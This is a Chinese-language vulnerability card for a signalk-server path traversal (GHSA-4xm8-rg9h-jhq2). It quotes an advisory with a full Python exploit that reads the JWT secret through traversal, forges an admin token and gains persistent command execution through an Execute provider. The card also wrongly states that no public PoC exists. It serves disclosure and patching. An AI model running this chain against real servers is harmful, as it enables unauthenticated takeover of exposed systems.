# GHSA-4xm8-rg9h-jhq2 — signalk-server路径遍历窃取密钥

> 开源,可源码审计复现

| 项目 | 值 |
|---|---|
| 优先级 | P1 重点关注 |
| 复现价值 | 值得 |
| 组件类别 | 未知 |
| 漏洞类型 | 路径遍历/任意文件读取 |
| CVSS | 9.8(CRITICAL) |
| EPSS | 未知 |
| 利用难度 | 低(远程·免认证) |
| 披露日期 | 2026-10-30 |

## 一句话摘要

开启readonly时未授权攻击者经路径遍历读取security.json密钥，伪造JWT后可执行命令

## 漏洞原理

**路径遍历/任意文件读取**: 文件路径参数未规范化校验,../ 序列逃出预期目录,读取任意文件(配置/密钥/源码)。

**官方描述(NVD 原文)**:

> ### Summary Path traversal in the Signal K resources and applicationData APIs lets an unauthenticated or low-privileged user read, write and delete files outside the storage root. Reading <config>/security.json discloses the JWT signing secret, enabling admin token forgery and remote code execution. ### Details ## Description The v2 REST resources API `GET /signalk/v2/api/resources/:resourceType/:resourceId` passes `resourceId` to `FileStore.getResource()` without validation. `getResource()` builds the file path with `path.join(this.resources[type].path, itemUuid)` followed by `readFile` + `JSON.parse`, so a `%2F`-encoded multi-level traversal (`..%2F..%2F..%2F..%2F`) escapes the resource storage directory and returns any JSON file on the server (source: `src/api/resources/index.ts:559-600`, `packages/resources-provider-plugin/src/filestorage.ts:115-125`). Because the JWT signing secret is stored in plaintext in `<config>/security.json` (generated at `src/tokensecurity.ts:271`, persisted via `saveSecurityConfig` at `src/security.ts:377`), an unauthenticated attacker on deployments with `allow_readonly=true` (a supported, UI-toggleable configuration granting anonymous read access) can: 1. **Read `<config>/security.json`** — disclosing the JWT signing secret (512-hex) and user password hashes. 2. **Forge an admin JWT** — HS256-sign `{"id":"admin"}` with the disclosed secret; accepted by `/skServer/loginStatus` (`userLevel: "admin"`) and all admin-protected endpoints (`adminAuthenticationMiddleware`, `src/tokensecurity.ts:593`, applied at `src/tokensecurity.ts:953`). 3. **Gain remote code execution** — `POST /skServer/providers` (admin) accepts a provider of type `Execute`; `packages/streams/src/execute.ts:93` executes it via `spawn('sh', ['-c', command])` at creation time. The provider persists to `settings.json` and survives restarts. On default deployments (`allow_readonly=false`), step 1 returns 401 to anonymous users but succeeds with any readonly user token. ## Suggested fixes 1. Validate `resourceId` against a strict whitelist (for example, UUID format) in `src/api/resources/index.ts` before any storage call, including PUT/DELETE. 2. In `FileStore.getResource/setResource/deleteResource`, canonicalise with `path.resolve()` and reject results outside `this.resources[type].path`. 3. Store the JWT signing secret outside the API-readable config directory, in a dedicated key file with mode 0600. 4. Consider gating provider types that execute commands (`Execute`) behind an explicit opt-in. ### Proof of concept Fully local testbed. Start the server, enable `allow_readonly=true`, then run: ```python #!/usr/bin/env python3 import base64, hashlib, hmac, json, time, urllib.request BASE = "http://127.0.0.1:3000" CMD = "id > /tmp/sk-pwned" # 1) unauthenticated traversal read of security.json p = "/signalk/v2/api/resources/notes/..%2F..%2F..%2F..%2Fsecurity.json" sk = json.load(urllib.request.urlopen(BASE + p))["secretKey"] # 2) forge admin JWT b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode() h = b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode()) c = b64(json.dumps({"id":"admin","iat":int(time.time())}).encode()) tok = h+"."+c+"."+b64(hmac.new(sk.encode(), (h+"."+c).encode(), hashlib.sha256).digest()) req = urllib.request.Request(BASE+"/skServer/loginStatus", headers={"Authorization":"JWT "+tok}) assert json.load(urllib.request.urlopen(req))["userLevel"] == "admin" # 3) add an Execute provider -> spawn('sh','-c',CMD) prov = {"id":"poc-rce","enabled":True,"logging":False,"type":"Execute", "options":{"type":"ws","dataType":"SignalK","command":CMD}} req = urllib.request.Request(BASE+"/skServer/providers", data=json.dumps(prov).encode(), headers={"Authorization":"JWT "+tok,"Content-Type":"application/json"}, method="POST") print(urllib.request.urlopen(req).read()) # provider created; /tmp/sk-pwned now exists ``` Reproduction verified independently on master `340d5bb6` (Node 22 / macOS), including restart persistence. PoC artifacts are available on request. ### Impact Unauthenticated access (with `allow_readonly=true`) leads to full compromise of the server process: arbitrary JSON file read, admin takeover, arbitrary command execution with server privileges, and persistent re-execution after restart. All signalk-server releases and all published versions of the bundled/standalone resources-provider prior to 2.34.0 are affected with the patched version as 2.34.0 fix

## 影响版本

npm:signalk-server >= 2.0.0, < 2.34.0(修复: 2.34.0); npm:@signalk/resources-provider >= 1.0.0, < 1.5.3(修复: 1.5.3)

**包生态(GHSA)**:

- npm:signalk-server >= 2.0.0, < 2.34.0(修复: 2.34.0)
- npm:@signalk/resources-provider >= 1.0.0, < 1.5.3(修复: 1.5.3)

> 已有官方修复版本,尽快升级。

## PoC 与武器化状态

暂无公开 PoC。

## 源码与资料

- 源码/包: [npm:signalk-server](https://www.npmjs.com/package/signalk-server)
- [GitHub 代码中搜索此 CVE](https://github.com/search?q=GHSA-4xm8-rg9h-jhq2&type=code)(找 PoC/利用片段)
- [GitHub 安全通告检索](https://github.com/advisories?query=GHSA-4xm8-rg9h-jhq2)
- [分析文章检索](https://www.google.com/search?q=GHSA-4xm8-rg9h-jhq2+exploit+analysis)

## 复现建议

**要点**: 未授权遍历notes接口读security.json取secretKey，再伪造JWT调用命令
**影响面**: 船艇/物联网数据网关，常暴露内网
**利用门槛**: 低(远程·免认证)

## 处置建议

升级至2.34.0，并同步升级resources-provider至1.5.3

## 参考

- [GHSA](https://github.com/advisories/GHSA-4xm8-rg9h-jhq2)
